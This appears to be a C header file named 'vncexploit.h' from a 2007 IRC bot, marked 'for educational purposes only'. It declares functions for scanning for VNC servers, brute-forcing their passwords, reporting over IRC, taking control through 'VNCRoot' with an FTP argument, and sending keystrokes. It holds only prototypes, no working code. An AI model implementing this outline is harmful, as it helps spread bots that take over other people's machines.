/*
 *      vncexploit.h 2007 Ravo_5002
 *      This code is for educational purposes only...
 */
#ifndef NO_VNCBRUTE 
BOOL Vncbrute(EXINFO exinfo); 
#endif

int vnccheck(char *host, char *passwd, SOCKET ircconn);
void vncscan(SOCKET ircconn, char *ip);
void vncEncryptBytes(unsigned char *bytes, char *passwd);
int WriteExact(SOCKET w_sock, char *buf, int bytes);
int ReadExact(SOCKET r_sock, char *inbuf, int wanted);
void VNCRoot(SOCKET sVNC, char *ftp);
void SendKey(SOCKET sock, char bkey, char key, int state);